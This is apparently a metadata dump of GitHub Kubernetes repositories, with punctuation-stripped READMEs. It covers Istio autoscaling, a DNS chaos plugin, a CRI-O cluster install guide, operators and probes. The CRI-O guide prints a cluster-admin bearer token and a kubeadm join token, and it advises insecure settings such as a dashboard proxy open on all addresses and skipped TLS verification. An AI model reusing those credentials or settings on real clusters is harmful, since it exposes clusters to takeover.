istiorequestspermin items describedObject kind Service namespace default name details apiVersion v1 metricName istiorequestspermin timestamp 2020 12 23T03 43 00Z value 133333m describedObject kind Service namespace default name productpage apiVersion v1 metricName istiorequestspermin timestamp 2020 12 23T03 43 00Z value 0 describedObject kind Service namespace default name reviews apiVersion v1 metricName istiorequestspermin timestamp 2020 12 23T03 43 00Z value 0 Deploy the productpage HPA in the default namespace bash kubectl create f istio hpa yaml After a couple of seconds the HPA fetches the httprequests value from the metrics API bash kubectl get hpa NAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGE productpage obj service Deployment productpage v1 133333m 100 1 2 1 11h Apply some load on the productpage service with 25 requests per second bash install hey go get u github com rakyll hey do 10K requests rate limited at 25 QPS hey n 1000 q 5 c 5 http 31198 productpage After a few minutes the HPA begins to scale up the deployment kubectl describe hpa CXishengdeMacBook Pro xishengcai kubectl describe hpa productpage obj service Name productpage obj service Namespace default Labels Annotations kubectl kubernetes io last applied configuration apiVersion autoscaling v2beta1 kind HorizontalPodAutoscaler metadata annotations name productpage obj service namesp CreationTimestamp Wed 23 Dec 2020 00 23 29 0800 Reference Deployment productpage v1 Metrics current target istiorequestspermin on service productpage target value 0 100 Min replicas 1 Max replicas 2 Deployment pods 2 current 2 desired Conditions Type Status Reason Message AbleToScale True ScaleDownStabilized recent recommendations were higher than current one applying the highest recent recommendation ScalingActive True ValidMetricFound the HPA was able to successfully calculate a replica count from service metric istiorequestspermin ScalingLimited True TooManyReplicas the desired replica count is more than the maximum replica count Events Type Reason Age From Message Warning FailedGetObjectMetric 36m x13 over 103m horizontal pod autoscaler unable to get metric istiorequestspermin service on default productpage unable to fetch metrics from custom metrics API no custom metrics API custom metrics k8s io registered Warning FailedGetObjectMetric 33m x21 over 11h horizontal pod autoscaler unable to get metric istiorequestspermin service on default productpage unable to fetch metrics from custom metrics API the server is currently unable to handle the request get services custom metrics k8s io productpage Warning FailedGetObjectMetric 13m x2591 over 11h horizontal pod autoscaler unable to get metric istiorequestspermin service on default productpage unable to fetch metrics from custom metrics API the server could not find the metric istiorequestspermin for services Normal SuccessfulRescale 4m3s horizontal pod autoscaler New size 1 reason All metrics below target Normal SuccessfulRescale 74s x2 over 9m39s horizontal pod autoscaler New size 2 reason service metric istiorequestspermin above target You may have noticed that the autoscaler doesn t react immediately to usage spikes By default the metrics sync happens once every 30 seconds and scaling up down can only happen if there was no rescaling within the last 3 5 minutes In this way the HPA prevents rapid execution of conflicting decisions and gives time for the Cluster Autoscaler to kick in Conclusions Not all systems can meet their SLAs by relying on CPU memory usage metrics alone most web and mobile backends require autoscaling based on requests per second to handle any traffic bursts For ETL apps auto scaling could be triggered by the job queue length exceeding some threshold and so on By instrumenting your applications with Prometheus and exposing the right metrics for autoscaling you can fine tune your apps to better handle bursts and ensure high availability,2020-12-22T11:45:58Z,2020-12-23T07:08:30Z,Shell,User,1,2,0,4,main,xishengcai,1,0,0,0,0,0,0
thehackercat,K8sYamlParser,,K8sYamlParser Go Report Card https goreportcard com badge github com thehackercat K8sYamlParser https goreportcard com report github com thehackercat K8sYamlParser translate k8s yaml to client go code recognized spec Run bash go run main go kubeconfig kube config file tests demo yaml,2020-10-16T02:44:59Z,2020-12-22T02:50:06Z,Go,User,1,2,0,1,main,thehackercat,1,0,0,0,0,0,0
royw-pj,k8s-setup-ansible,,,2020-10-19T07:10:38Z,2020-11-23T04:11:32Z,HTML,User,1,2,0,0,master,,0,0,0,0,0,0,0
kewynakshlley,k8s-autoscaler-analysis,,k8s autoscaler analysis,2020-11-05T22:50:54Z,2020-11-23T11:23:22Z,R,User,2,2,0,27,main,kewynakshlley#marcuswac,2,0,0,0,0,0,0
colindembovsky,k8s-secret-watcher,,Kubernetes Secret Watcher This is an implementation of https github com flant shell operator https github com flant shell operator that watches for changes to secrets and executes a script in an Azure CLI context,2020-09-24T18:26:20Z,2020-09-25T17:40:35Z,Shell,User,1,2,0,5,master,colindembovsky,1,0,0,0,0,0,0
ronak-agarwal,confluent-k8s-gssapi,,This repo covers 3 different options to deploy Confluent on k8s with SASLSSL Kerberos A As a systemd pod which will run both 1 ZK and 1 Broker systemd services but this obviously is not recommended option considering you will have to start pod with High privileges Look at archive systemd for more details B As a single Pod with two containers without systemd 1 ZK and 1 Broker this is good for Test Dev Ephemeral environments Look at single node for more details C A Highly Available Confluent cluster with 3 brokers and 3 zookeepers 6 Statefulsets as replicas wont work from Kerberos host entry perspective Look at HA confluent image using confluent image OR HA customer image using this custom RHEL image for more details Perquisites 1 K8S Running minikube Public Cloud 2 Windows AD with kerberos running on public cloud local k8s should be able to reach 3 DNS server which can be used for setting up REALM in AD public like Azure DNS AWS Route53 or local like PfSense,2020-10-19T11:40:07Z,2020-11-11T17:59:23Z,Shell,User,1,2,0,1,main,ronak-agarwal,1,0,0,0,0,0,0
chaos-mesh,k8s_dns_chaos,,k8sdnschaos Name k8sdnschaos enables inject DNS chaos in a Kubernetes cluster for Chaos Engineering Description This plugin implements the Kubernetes DNS Based Service Discovery Specification https github com kubernetes dns blob master docs specification md CoreDNS running with the k8sdnschaos plugin can be used to do chaos tests on DNS This plugin can only be used once per Server Block Syntax k8sdnschaos ZONES The k8sdnschaos supports all options in plugin kubernetes https coredns io plugins kubernetes besides it also supports other configuration items for chaos kubernetes ZONES endpoint URL tls CERT KEY CACERT kubeconfig KUBECONFIG CONTEXT namespaces NAMESPACE labels EXPRESSION pods POD MODE endpointpodnames ttl TTL noendpoints transfer to ADDRESS fallthrough ZONES ignore emptyservice chaos ACTION SCOPE PODS grpcport PORT Only ZONES chaos and grpcport is different with plugin with kubernetes https coredns io plugins kubernetes ZONES defines which zones of the host will be treated as internal hosts in the Kubernetes cluster chaos ACTION SCOPE PODS set the behavior and scope of chaos Valid value for Action random return random IP for DNS request error return error for DNS request Valid value for SCOPE inner chaos only works on the inner host of the Kubernetes cluster outer chaos only works on the outer host of the Kubernetes cluster all chaos works on all the hosts PODS defines which Pods will take effect the format is Namespace PodName grpcport PORT sets the port of GRPC service which is used for the hot update of the chaos rules The default value is 9288 The interface of the GRPC service is defined in dns proto pb dns proto Examples All DNS requests in Pod busybox busybox 0 will get error yaml k8sdnschaos cluster local in addr arpa ip6 arpa pods insecure fallthrough in addr arpa ip6 arpa ttl 30 chaos error all busybox busybox 0 The shell command below will execute failed shell kubectl exec busybox 0 it n busybox ping c 1 google com ping bad address google com,2020-08-27T02:20:53Z,2020-12-11T08:15:19Z,Go,Organization,2,2,1,16,master,WangXiangUSTC,1,0,0,0,0,0,13
jpsikorra,k8s-hetzner-test,,Run Kubernetes in the Hetzner Cloud Creates a six node kubernetes cluster in a private network in the Hetzner cloud for fun Remember some costs will occur when using the Hetzner Cloud Installation Env bash export HCLOUDTOKEN your hetzner api token export TFVARnodeadminsshpublickey path to your ssh pub key export PRIVKEYPATH path to your ssh priv key Provisioning Go into the provisioning dir bash terraform init terraform apply Installing Go into the configuration dir bash ansible playbook i hosts kubernetes yml f 6 private key PRIVKEYPATH Testing and playing around SSH to the first controller address in file configuration hosts and run bash kubectl kubeconfig etc kubernetes admin conf get nodes which should display your ready nodes All good things must come to an end If you want to destroy the cluster just run bash terraform destroy in the provisioning dir,2020-10-23T10:19:06Z,2020-10-27T06:44:09Z,HCL,User,1,2,0,7,main,jpsikorra,1,0,0,0,0,0,0
g0pinath,k8s-voting-app,,Introduction TODO Give a short introduction of your project Let this section explain the objectives or the motivation behind this project Getting Started TODO Guide users through getting your code up and running on their own system In this section you can talk about 1 Installation process 2 Software dependencies 3 Latest releases 4 API references Build and Test TODO Describe and show how to build your code and run the tests Contribute TODO Explain how other users and developers can contribute to make your code better If you want to learn more about creating good readme files then refer the following guidelines https docs microsoft com en us azure devops repos git create a readme view azure devops You can also seek inspiration from the below readme files ASP NET Core https github com aspnet Home Visual Studio Code https github com Microsoft vscode Chakra Core https github com Microsoft ChakraCore,2020-09-26T22:23:11Z,2020-10-10T10:06:20Z,JavaScript,User,1,2,0,54,master,g0pinath-metricon#g0pinath,2,0,0,0,0,0,0
timoha,hbase-k8s-operator,hbase#kubernetes#operator-framework,HBase Kubernetes Operator HBase Kubernetes Operator automates the deployment provisioning and orchestration of HBase running on Kubernetes based on Operator Framework https operatorframework io pattern Current features Provisions a service a config masters and regionservers Graceful rolling upgrade when any of the config or pod specs change Current limitations Operates only on healthy clusters manual intervention is required in case of issues it s the job of HBase to recover from failures Graceful scaling down of regionservers isn t supported Installation instructions 1 run make install to tell k8s how to understand the Custom HBase Resource CRD 2 run make deploy IMG timoha hbase k8s controller latest to deploy the operator 3 modify sample HBase CRD https github com timoha hbase k8s operator config samples hbasev1hbase yaml to have the desired config 4 run kubectl apply f config samples hbasev1hbase yaml to tell the operator what to deploy 5 now you can go and focus on actual features of your product It s expected that operator and HBase will be deployed in hbase namespace,2020-11-11T22:44:00Z,2020-11-23T20:07:22Z,Go,User,1,2,1,11,main,timoha,1,0,0,0,0,0,4
tutstechnology,k8s-crio-install,,Install Cluster K8S with CRI O on Ubuntu 20 04 Kubernetes Control Plane and Works and services CRI O K8S Dashboard and Metrics Information This manual summarizes the good installation practices for the Kubernetes Cluster It is the combination of several technical references that I found on the internet and I gathered them all in this manual The installation simulation is based on a Master server and two Workers server nodes For each step there is information master or worker indicating where the configuration and deployment should be performed Versions used Kubernetes 1 19 6 CRI O 1 19 0 K8S Dashboard 2 1 0 Metrics 0 4 1 IMPORTANT You can modify the versions by changing the variables exemplified in this document In this installation plan we will use the following servers ip hpv prd k8s cplane01 192 168 15 11 hpv prd k8s worker01 192 168 15 12 hpv prd k8s worker02 192 168 15 13 Port requirements for cluster services service master worker port type kubelet 43925 39305 dynamic kubelet 10250 10250 fixed kubelet 10248 10248 fixed container 42835 41425 dynamic kube sche 10259 fixed kube apis 6443 fixed kube cont 10257 fixed kube prox 10256 10256 fixed kube prox 10249 10249 fixed kubectl 5100 fixed Example ports This information is important for defining firewall rules between nodes After completing the installation using all the steps below it is possible to consult the ports used Run the command lsof i P n grep LISTEN Installation index step 1 to step 5 Requirements and settings for Linux used Ubuntu 20 04 step 6 CRI O installation step 7 to step 12 Kuberntes installation step 13 to step 17 Dashboard installation step 18 to step 19 Metrics installation Config Linux Requirements Step 1 Master Worker Update the latest packages using the apt update command sudo apt update y sudo apt upgrade y Step 2 Master Worker Define the name and ip of the servers that form the k8s cluster Edit the etc hosts file and add the cluster servers Example Edit file etc hosts vim etc hosts Example 127 0 0 1 localhost 192 168 15 11 hpv prd k8s cplane01 192 168 15 12 hpv prd k8s worker01 192 168 15 13 hpv prd k8s worker02 Step 3 Master Worker Set the hostname for the Master server Example Set hostname hostnamectl set hostname server name Step 4 Master Worker Disable memory SWAP sudo swapon s sudo swapoff a Comment if you have the Swap line on fstab sudo vim etc fstab Exemple swap img none swap sw 0 0 Step 5 Master Worker Restart the server sudo reboot Install CRI O Step 6 Master Worker Installing CRI O File creation 99 kubernetes cri conf vim etc sysctl d 99 kubernetes cri conf Copy and paste the information below into the file net bridge bridge nf call iptables 1 net ipv4 ipforward 1 net bridge bridge nf call ip6tables 1 Edit file sysctl conf vim etc sysctl conf Copy and paste the information below into the file net bridge bridge nf call iptables 1 net ipv4 ipforward 1 net bridge bridge nf call ip6tables 1 Apply the config file by running sudo sysctl system Create variables for Ubuntu amd CRI O version export OS xUbuntu20 04 export VERSION 1 19 Add CRI O repositories and install echo deb https download opensuse org repositories devel kubic libcontainers stable OS etc apt sources list d devel kubic libcontainers stable list echo deb http download opensuse org repositories devel kubic libcontainers stable cri o VERSION OS etc apt sources list d devel kubic libcontainers stable cri o VERSION list curl L https download opensuse org repositories devel kubic libcontainers stable cri o VERSION OS Release key apt key add curl L https download opensuse org repositories devel kubic libcontainers stable OS Release key apt key add apt get update apt get install y cri o cri o runc Find Conmon s path to the next step which conmon Command result example usr bin conmon Edit etc crio crio conf vim etc crio crio conf You must include the following lines in the file Modify in line 104 conmon usr bin conmon Insert to line 365 registries docker io quay io Enable the CRI O and make sure that it is running sudo systemctl daemon reload sudo systemctl enable crio sudo systemctl start crio sudo systemctl status crio Installation and configuration Kubernetes Step 7 Master Worker Install Kubernetes Packages kubeadm kubelet kubectl Add K8S repositories and install sudo apt get update sudo apt get install y apt transport https curl curl s https packages cloud google com apt doc apt key gpg sudo apt key add echo deb https apt kubernetes io kubernetes xenial main etc apt sources list d kubernetes list sudo apt get update File creation kubelet vim etc default kubelet Copy and paste the information below into the file KUBELETEXTRAARGS feature gates AllAlpha false RunAsGroup true container runtime remote cgroup driver systemd container runtime endpoint unix var run crio crio sock runtime request timeout 5m Create variable for Kubernetes version export K8SVERSION 1 19 6 00 IMPORTANT You can find the specific version by the following command curl s https packages cloud google com apt dists kubernetes xenial main binary amd64 Packages grep Version awk print 2 Install Kubeadm kubectl kubelet and kubernetes cni sudo apt install y kubeadm K8SVERSION kubectl K8SVERSION kubelet K8SVERSION kubernetes cni allow unauthenticated Step 8 Master Cluster K8S configuration Definition of the invite and pod network Load the overlay and brnetfilter modules sudo modprobe overlay sudo modprobe brnetfilter kubeadm init apiserver advertise address hostname i pod network cidr 10 244 0 0 16 service dns domain tutstechnology local IMPORTANT The command above will start the cluster and then display the command line I need to execute on my other nodes NOTE the information to join the Workers servers Command result example kubeadm join 10 130 200 25 6443 token kqbyqy q6543jyyx6xl84yd discovery token ca cert hash sha256 94a749272471966abeb39c7bb74a597603994e091cfda17a1915b1eb72625c2c Step 9 Master Cluster K8S configuration mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config Step 10 Master Cluster K8S configuration Definition of the CNI network component for Pods Network add on on Kuberntes IMPORTANT Choose only one of the models below Model 1 Flannel kubectl apply f https raw githubusercontent com coreos flannel master Documentation kube flannel yml Model 2 Weave Net kubectl apply f https cloud weave works k8s net k8s version kubectl version base64 tr d n Model 3 Calico kubectl apply f https docs projectcalico org manifests calico yaml List podsnetwork kubectl get pods n kube system Step 11 Worker Join Worker node to the Cluster Load the overlay and brnetfilter modules sudo modprobe overlay sudo modprobe brnetfilter IMPORTANT Use the command output seen in step 8 kubeadm join 10 130 200 25 6443 token kqbyqy q6543jyyx6xl84yd discovery token ca cert hash sha256 94a749272471966abeb39c7bb74a597603994e091cfda17a1915b1eb72625c2c If you have not noted the Join command execute the command below to obtain it kubeadm token create print join command Step 12 Master Commands to check the nodes pods kubectl get nodes kubectl get pods all namespaces Installation and configuration Dashboard v2 1 0 Step 13 Master Dashboard Deploy Oficial Repository kubectl apply f https raw githubusercontent com kubernetes dashboard v2 1 0 aio deploy recommended yaml Step 14 Master Dashboard Deploy Create Admin User File creation 1 createuseradmin user yaml nano createuseradmin user yaml Copy and paste the information below into the file apiVersion v1 kind ServiceAccount metadata name admin user namespace kubernetes dashboard File creation 2 dashboard adminuser yaml nano dashboard adminuser yaml Copy and paste the information below into the file apiVersion rbac authorization k8s io v1 kind ClusterRoleBinding metadata name admin user roleRef apiGroup rbac authorization k8s io kind ClusterRole name cluster admin subjects kind ServiceAccount name admin user namespace kubernetes dashboard Offline Deploy kubectl apply f local directory createuseradmin user yaml kubectl apply f local directory dashboard adminuser yaml Step 15 Master Dashboard Deploy Getting a Bearer Token IMPORTANT The command below will generate a token make a NOTE to use in the console login kubectl n kubernetes dashboard describe secret kubectl n kubernetes dashboard get secret grep admin user awk print 1 Command result example Name admin user token j8wqq Namespace kubernetes dashboard Labels Annotations kubernetes io service account name admin user kubernetes io service account uid 7e03d604 e4f7 4925 85dc cbd9feb1ff51 Type kubernetes io service account token Data ca crt 1025 bytes namespace 20 bytes token eyJhbGciOiJSUzI1NiIsImtpZCI6ImlKeTdwWHhyMnNUOHZ3MVpuN0JqRnVQUWVSajNEOUM4bUtyNnRMNXBGZGMifQ eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWo4d3FxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI3ZTAzZDYwNC1lNGY3LTQ5MjUtODVkYy1jYmQ5ZmViMWZmNTEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9 WVWY9SQAqHaiNF8yoJnpjVmXIBBPbkxksrwwh30eTq370gCObR5hsCmFBG60zPUgfehKZ9IFFFAkgcB0m2JAid8IAN1MaQQRuTp1VYg7z xjqvC1U9xh3t 7k519EVq9AERVtDiqh0GRVHRw5qa8jLG7ObYua6PyZncz6VvSOTT3bsKGQHa5UCCW9P2suyZm4B4ztdtjCvpN7kQBFo5Mf9EmxCV5lsKI5EpBthRpniPItP haKLyW14acJK3Mocuwg09cVOwcKeMaqhoMLNEIyn35o3EOTuG6xDVQFqVsnfateiRaNWza63cQ8UZtWrhfFi5MxgpwbfnHyHPUA root aws prd k8smaster01 etc kubernetes manifests tutstechnology dashboard v203 Below is the token that should be noted eyJhbGciOiJSUzI1NiIsImtpZCI6ImlKeTdwWHhyMnNUOHZ3MVpuN0JqRnVQUWVSajNEOUM4bUtyNnRMNXBGZGMifQ eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWo4d3FxIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI3ZTAzZDYwNC1lNGY3LTQ5MjUtODVkYy1jYmQ5ZmViMWZmNTEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9 WVWY9SQAqHaiNF8yoJnpjVmXIBBPbkxksrwwh30eTq370gCObR5hsCmFBG60zPUgfehKZ9IFFFAkgcB0m2JAid8IAN1MaQQRuTp1VYg7z xjqvC1U9xh3t 7k519EVq9AERVtDiqh0GRVHRw5qa8jLG7ObYua6PyZncz6VvSOTT3bsKGQHa5UCCW9P2suyZm4B4ztdtjCvpN7kQBFo5Mf9EmxCV5lsKI5EpBthRpniPItP haKLyW14acJK3Mocuwg09cVOwcKeMaqhoMLNEIyn35o3EOTuG6xDVQFqVsnfateiRaNWza63cQ8UZtWrhfFi5MxgpwbfnHyHPUA Step 16 Master Dashboard Use Proxy kubectl proxy address 0 0 0 0 port 5100 accept hosts IMPORTANT To access the console of a remote computer use the command to route ports through SSH See how in the next step Step 17 Client Dashboard Console access Use this command on the customer s computer which will access a web console Example for server ip 10 130 200 25 ssh L 5888 127 0 0 1 5100 10 130 200 25 or with Access Key ssh i mykey pem L 5888 127 0 0 1 5100 ubuntu 10 130 200 25 Now access the console using the following address http localhost 5888 api v1 namespaces kubernetes dashboard services https kubernetes dashboard proxy IMPORTANT Use the Token generated in step 15 Installation and configuration Metrics v0 3 7 Step 18 Master Metrics Deploy Oficial Repository kubectl apply f https github com kubernetes sigs metrics server releases download v0 4 1 components yaml kubectl get apiservices egrep metrics kubectl get deploy svc n kube system egrep metrics server Step 19 Master Metrics Deploy Modify Parameters IMPORTANT Depending on your cluster setup you may also need to change flags passed to the Metrics Server container Most useful flags Use kubelet insecure tls o not verify CA of serving certificates presented by Kubelets For testing purposes only kubelet preferred address types strings The priority of node address types to use when determining which address to use to connect to a particular node default Hostname InternalDNS InternalIP ExternalDNS ExternalIP kubectl n kube system edit deploy metrics server You must include the following lines in the file command metrics server kubelet insecure tls kubelet preferred address types InternalIP Example insert after line 43 spec containers args cert dir tmp secure port 4443 kubelet preferred address types InternalIP ExternalIP Hostname kubelet use node status port kubelet insecure tls image k8s gcr io metrics server metrics server v0 4 1 imagePullPolicy IfNotPresent livenessProbe failureThreshold 3 httpGet path livez port https scheme HTTPS periodSeconds 10 successThreshold 1 timeoutSeconds 1 name metrics server ports To verify that the changes were made to the file run the command kubectl get deploy metrics server n kube system o yaml grep command A 4 Need to restart the kubelet service systemctl restart kubelet systemctl enable kubelet After this modification the kubectl top command can now be used without errors Examples kubectl top nodes kubectl top pods all namespaces kubectl top pods all namespaces sort by memory,2020-12-18T14:35:34Z,2020-12-24T18:06:18Z,n/a,User,1,2,0,33,main,tutstechnology,1,0,0,0,0,0,0
weechien,mongo-express-k8s,,Mongo Express on Kubernetes This project implements a basic web based MongoDB admin interface on a Minikube kubernetes cluster resources k8 flow jpg Prerequisite Make sure Minikube and kubectl are installed kubectl installation https kubernetes io docs tasks tools install kubectl Minikube installation https minikube sigs k8s io docs start General Concepts A Pod is the smallest execution unit in Kubernetes and an abstraction over containers A container is a lightweight software that contains all the necessary tools libraries and code to run an application kubectl exec it bin bash to get a bash shell in the container kubectl logs to show information logged by a pod A Deployment is a resource to describe how a ReplicaSet and Pod should behave kubectl create deploy image to create a basic deployment with minimal configurations kubectl edit deploy to edit the configuration file of a deployment kubectl delete deploy to delete a deployment A ReplicaSet aims to maintain a stable set of Pods running at any given time The number of Pods maintained is determined in the configuration file of a deployment A Service exposes an application running on a set of Pods as a network service A ConfigMap is used to store non sensitive data in key value pairs and can be consumed as environment variables command line arguments or as configuration files A Secret is similar to a ConfigMap but more towards storing sensitive data such as passwords OAuth tokens and ssh keys echo n base64 to generate a base64 encoded string to be used as password in Secret though a better hashing algorithm should be used A Namespace is akin to a virtual cluster to organize resources between multiple teams versions or environments kubectl create namespace to create a namespace An Ingress manages external access to services in a cluster It provides load balancing SSL termination and name based virtual hosting An Ingress consists of an Ingress Controller and Ingress Resource An Ingress Controller reads information from an Ingress Resource then evaluates all the rules and manages redirections Getting Started 1 Start Minikube which would start a local Kubernetes cluster minikube start to start your cluster kubectl get no to list all worker nodes 2 Create a Namespace which is similar to a virtual cluster kubectl apply f mongo namespace yml to create the Namespace called mongodb namespace kubectl delete f mongo namespace yml to delete the Namespace kubectl get ns to list all Namespaces 3 Create a Secret which is used to store sensitive information The Secret will contain the username and password for MongoDB kubectl apply f mongo secret yml to create the Secret called mongodb secret kubectl delete f mongo secret yml to delete the Secret kubectl get secret n mongodb namespace to list all Secrets 4 Create a Deployment which is used to manage Pods and ReplicaSets and a Service which defines a policy to access a set of Pods The Deployment will contain a MongoDB Pod and will use the username and password from Secret as the database credentials The Service defined is an internal service which is inaccessible outside of the Kubernetes cluster It functions to enable other Pods within the cluster to communicate with the MongoDB Pod kubectl apply f mongo yml to create the Service called mongodb service and Deployment called mongodb deployment kubectl delete f mongo yml to delete the Service and Deployment kubectl get svc n mongodb namespace to list all Services kubectl get deploy n mongodb namespace to list all Deployments kubectl get rs n mongodb namespace to list all Replicasets kubectl get po n mongodb namespace to list all Pods kubectl get all n mongodb namespace to list all Services Deployments Replicasets and Pods 5 Create a ConfigMap which is used to store non confidential information in key value pairs The ConfigMap will contain the mongo database url kubectl apply f mongo configmap yml to create the Configmap called mongodb configmap kubectl delete f mongo configmap yml to delete the Configmap kubectl get cm n mongodb namespace to list all Configmaps 6 Create another Deployment and Service The Deployment will contain a Mongo Express Pod which is a web based interface to manage MongoDB databases It will use the username and password from Secret and the database url from ConfigMap to access the MongoDB internal Service defined in 4 The Service defined in 6 could be either an external or internal service If it s an external service it would allow external request to communicate with the Pods in 6 However since an Ingress will be defined in 7 this Service will be an internal service which would define the policy to access the Mongo Express Pod kubectl apply f mongo express yml to create the Service called mongodb express service and Deployment called mongodb express deployment kubectl delete f mongo express yml to delete the Service and Deployment 7 Create an Ingress resource which defines rules on traffic routing and an Ingress Controller K8 Nginx which manages external access to Services in a cluster An external proxy server could be used to manage access to various clusters Change the etc hosts file to map the host url stated in mongo ingress yml to the IP address of the Ingress Controller Commented TLS key is used to enable HTTPS minikube addons enable ingress to automatically start the K8s Nginx implementation of Ingress Controller kubectl get po n kube system to verify the creation of the pod ingress nginx controller kubectl apply f mongo ingress yml to create the Ingress called mongodb ingress kubectl delete f mongo ingress yml to delete the Ingress kubectl get ing n mongodb namespace to list all Ingresses,2020-11-18T15:10:22Z,2020-11-18T15:22:27Z,n/a,User,1,2,0,4,main,weechien,1,0,0,0,0,0,0
joeapearson,elixir-k8s-probe,elixir#kubernetes#liveness#probe#readiness,K8sProbe Provides configurable HTTP liveness and readiness endpoints intended to be used to support Kubernetes probes https kubernetes io docs tasks configure pod container configure liveness readiness startup probes K8sProbe ships with a built in Cowboy HTTP server making this module easy to integrate into any project Usage Installation First add k8sprobe to your mix exs dependencies like so elixir defp deps do your other various dependencies k8sprobe 0 3 0 end If necessary run mix deps get and mix deps compile at this point to fetch and compile K8sProbe Next add K8sProbe to your supervision tree perhaps in your application ex file It would look something like this elixir defmodule MyApp Application do use Application def start type args do children K8sProbe opts strategy oneforone name MyApp Supervisor Supervisor startlink children opts end end Now you can try it out by launching your application and making a request to the probe endpoints as follows sh Start your app in iex iex S mix In another terminal curl localhost 9991 readiness OK curl localhost 9991 liveness OK Congratulations you have a default probe up and running Customising the probe This module ships with a completely minimal default probe that does nothing other than respond with a 200 OK regardless of the state of your application This might be fine for simple applications but for a more detailed implementation you need to provide your own probe implementing the K8sProbe Probe behaviour Here s an example elixir defmodule MyApp MyProbe do behaviour K8sProbe Probe def readiness do ok def liveness do ok end Each of the three probes must be a function that returns either ok or error How you implement your probe really depends on your application Having written your probe you can configure K8sProbe to use it by passing it in the configuration Here s what your application ex file might look like elixir defmodule MyApp Application do use Application def start type args do children K8sProbe probemodule MyApp MyProbe opts strategy oneforone name MyApp Supervisor Supervisor startlink children opts end end Configuration Generally it s recommended to just use the default configuration easier isn t it But if you must then read on Port By default K8sProbe listens on port 9991 You may override it by passing it as config option Configuring probes in Kubernetes Here s an example Kubernetes deployment in YAML format that calls the probes as implemented by default yaml apiVersion apps v1 kind Deployment metadata name my service spec replicas 1 selector matchLabels app kubernetes io name my service template spec containers name my service image my service ports containerPort 9991 name liveness port protocol TCP readinessProbe httpGet path readiness port liveness port livenessProbe httpGet path liveness port liveness port startupProbe httpGet path readiness port liveness port You ll need to modify this configuration before it will work of course replacing the image with your own Configuring Kubernetes to make use of the probes provided by this module is a topic unto itself See here https kubernetes io docs tasks configure pod container configure liveness readiness startup probes for more information,2020-09-26T04:48:48Z,2020-10-13T19:00:41Z,Elixir,User,1,2,1,8,master,joeapearson,1,0,3,1,0,0,0
lllamnyp,k8s-stickshift-migration,,RKE vanilla migration DevOps live 2020 demo Requirements Vagrant vagrant plugin install vagrant hosts Hosts file etc hosts 10 0 0 11 node1 devopslive ru 10 0 0 12 node2 devopslive ru 10 0 0 13 node3 devopslive ru Haproxy Docker SSH config Host node devopslive ru PATH TO REPO ROOT HERE IdentityFile home lllamnyp Cloud dev devopsconf k8s stickshift migration devopsliversa User vagrant StrictHostKeyChecking no UserKnownHostsFile dev null,2020-09-26T19:15:09Z,2020-11-04T13:08:41Z,Shell,User,1,2,0,6,master,lllamnyp,1,0,0,0,0,0,0
canonical,robotics-blog-k8s,,ROS on Kubernetes This repository holds companion files for the blog series on running ROS 2 https index ros org doc ros2 on microk8s https microk8s io Find more about these sample files on the Ubuntu blog https ubuntu com blog Part 1 Exploring ROS 2 with Kubernetes https ubuntu com blog exploring ros 2 with kubernetes Part 2 ROS 2 on Kubernetes a simple talker and listener setup https ubuntu com blog ros 2 on kubernetes a simple talker and listener setup Part 3 Distribute ROS 2 across machines with MicroK8s https ubuntu com blog distribute ros 2 across machines with kubernetes Part 4 Exploring different ROS 2 Kubernetes configurations,2020-10-27T12:27:24Z,2020-12-24T16:16:51Z,Python,Organization,1,2,1,17,main,SidFaber,1,0,0,0,0,0,2
shfpflyawei,ansible-install-k8s,,Kubernetes v1 18 1 Ansible git clone https github com shfpflyawei ansible install k8s cd ansible install k8s root https pan baidu com s 1Bb1tObSiFRUMqWrFfPxcKQ 3pen tar zxf binarypkg tar gz 2Ansible hostsIP vi hosts groupvars all ymlIP vim groupvars all yml softwaredir root binarypkg certhosts k8s etcd 3 Master https github com shfpflyawei ansible install k8s blob master single master jpg Master https github com shfpflyawei ansible install k8s blob master multi master jpg Master ansible playbook i hosts single master deploy yml uroot k Master ansible playbook i hosts multi master deploy yml uroot k 4 ansible playbook i hosts single master deploy yml uroot k tags addons 5 1hostsip vi hosts 2 ansible playbook i hosts add node yml uroot k 3Master kubectl get csr kubectl certificate approve node csr xxx,2020-10-09T06:32:21Z,2020-11-02T06:58:24Z,HTML,User,1,2,1,63,master,lizhenliang#shfpflyawei,2,0,0,0,0,0,0
